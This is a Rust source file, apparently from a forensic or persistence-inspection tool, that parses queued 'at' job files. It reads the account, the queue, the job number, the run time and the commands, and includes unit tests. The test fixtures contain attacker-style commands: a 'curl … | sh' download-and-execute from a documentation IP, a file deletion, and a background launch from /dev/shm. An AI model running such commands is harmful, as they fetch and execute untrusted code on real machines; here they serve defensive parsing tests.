//! `at` jobs waiting to run (`var/spool/cron/atjobs/*` on Debian,
//! `var/spool/at/*` on RHEL, `var/at/jobs/*` on BSD): the shell script
//! `at` wrote, whose header records the account and whose end holds the
//! commands. The file name holds the queue, the job number and when it
//! runs (`a0000101c790d2`: queue `a`, job 1, minute `0x01c790d2` of the
//! Unix epoch, UTC: 07:14 on 2026-10-07).
//!
//! The commands follow the `cd … || { … }` block at's header ends with;
//! at 3.1 put them in a here-document instead
//! (`${SHELL:-/bin/sh} << 'marcinDELIMITER…'`), which is read too.

use common::time::Ts;

use crate::text::{logical_lines, Continuation};
use crate::{Detail, Entry, Kind, Parsed};

/// Read an at job named `name` (its file name).
pub(crate) fn job(text: &str, name: Option<&str>) -> Parsed {
    let mut parsed = Parsed::default();
    let lines = logical_lines(text, Continuation::Shell);
    let mut uid = None;
    let mut user = None;
    for (_, line) in &lines {
        if let Some(rest) = line.strip_prefix("# atrun uid=") {
            uid = rest.split_whitespace().next().and_then(|u| u.parse().ok());
        } else if let Some(rest) = line.strip_prefix("# mail ") {
            user = rest.split_whitespace().next().map(str::to_owned);
        }
    }
    let Some(commands) = commands(&lines) else {
        parsed.problem(1, "no commands after at's header");
        return parsed;
    };
    let (queue, number, runs) = match name.and_then(file_name) {
        Some((queue, number, runs)) => (Some(queue), Some(number), Some(runs)),
        None => (None, None, None),
    };
    for (number_in_file, command) in commands {
        let mut entry = Entry::new(
            Kind::AtJob,
            *number_in_file,
            Detail::AtJob {
                queue,
                job: number,
                uid,
            },
        );
        entry.user.clone_from(&user);
        entry.command = Some(command.trim().to_owned());
        entry.schedule.clone_from(&runs);
        parsed.entries.push(entry);
    }
    parsed
}

/// The command lines: those of the here-document when there is one, else
/// those after the header's `cd … || {` block; blank lines and comments
/// left out.
fn commands(lines: &[(usize, String)]) -> Option<Vec<&(usize, String)>> {
    let body = here_document(lines).or_else(|| after_header(lines))?;
    Some(
        body.iter()
            .filter(|(_, line)| !line.trim().is_empty() && !line.trim_start().starts_with('#'))
            .collect(),
    )
}

/// at 3.1's `${SHELL:-/bin/sh} << 'marcinDELIMITER…'`, up to its delimiter.
fn here_document(lines: &[(usize, String)]) -> Option<&[(usize, String)]> {
    let (at, delimiter) = lines.iter().enumerate().find_map(|(at, (_, line))| {
        let (_, marker) = line.split_once("<< ")?;
        let delimiter = marker.trim().trim_matches('\'');
        delimiter
            .starts_with("marcinDELIMITER")
            .then_some((at, delimiter))
    })?;
    let rest = &lines[at + 1..];
    let end = rest
        .iter()
        .position(|(_, line)| line.trim() == delimiter)
        .unwrap_or(rest.len());
    Some(&rest[..end])
}

/// What follows the header's `cd … || {` block, closed by a lone `}`.
fn after_header(lines: &[(usize, String)]) -> Option<&[(usize, String)]> {
    let cd = lines
        .iter()
        .position(|(_, line)| line.starts_with("cd ") && line.trim_end().ends_with('{'))?;
    let close = lines
        .iter()
        .skip(cd + 1)
        .position(|(_, line)| line.trim() == "}")?;
    Some(&lines[cd + close + 2..])
}

/// Queue, job number and run time from a job's file name.
fn file_name(name: &str) -> Option<(char, u32, String)> {
    let mut chars = name.chars();
    let queue = chars.next().filter(char::is_ascii_alphabetic)?;
    let rest = chars.as_str();
    if rest.len() != 13 || !rest.bytes().all(|b| b.is_ascii_hexdigit()) {
        return None;
    }
    let job = u32::from_str_radix(&rest[..5], 16).ok()?;
    let minutes = i64::from_str_radix(&rest[5..], 16).ok()?;
    let iso = Ts::from_unix_seconds(minutes * 60).to_iso8601()?;
    // Whole minutes: `2026-10-07T07:14Z`.
    let runs = format!("{}Z", iso.get(..16)?);
    Some((queue, job, runs))
}

#[cfg(test)]
mod tests {
    use super::*;

    const HEADER: &str = "#!/bin/sh\n# atrun uid=1000 gid=1000\n# mail alice 0\numask 22\nPATH=/usr/bin:/bin; export PATH\ncd /home/alice || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";

    #[test]
    fn at_3_2_jobs() {
        let text = format!("{HEADER}curl -s http://192.0.2.8/a | sh\n\nrm -f ~/.x\n");
        let parsed = job(&text, Some("a0000101c790d2"));
        assert!(parsed.problems.is_empty());
        let entry = &parsed.entries[0];
        assert_eq!(
            (entry.line, entry.user.as_deref(), entry.schedule.as_deref()),
            (10, Some("alice"), Some("2026-10-07T07:14Z"))
        );
        assert_eq!(
            entry.detail,
            Detail::AtJob {
                queue: Some('a'),
                job: Some(1),
                uid: Some(1000)
            }
        );
        assert_eq!(parsed.entries[1].command.as_deref(), Some("rm -f ~/.x"));
    }

    #[test]
    fn at_3_1_here_documents() {
        let text = HEADER.to_owned()
            + "${SHELL:-/bin/sh} << 'marcinDELIMITER2b1c4d7e'\n/dev/shm/x &\nmarcinDELIMITER2b1c4d7e\n";
        let parsed = job(&text, Some("not-a-job-name"));
        let commands: Vec<_> = parsed
            .entries
            .iter()
            .map(|e| e.command.as_deref())
            .collect();
        assert_eq!(commands, [Some("/dev/shm/x &")]);
        assert_eq!(parsed.entries[0].schedule, None);
    }

    #[test]
    fn files_that_are_not_jobs() {
        assert_eq!(job("12\n", Some(".SEQ")).problems.len(), 1);
    }
}
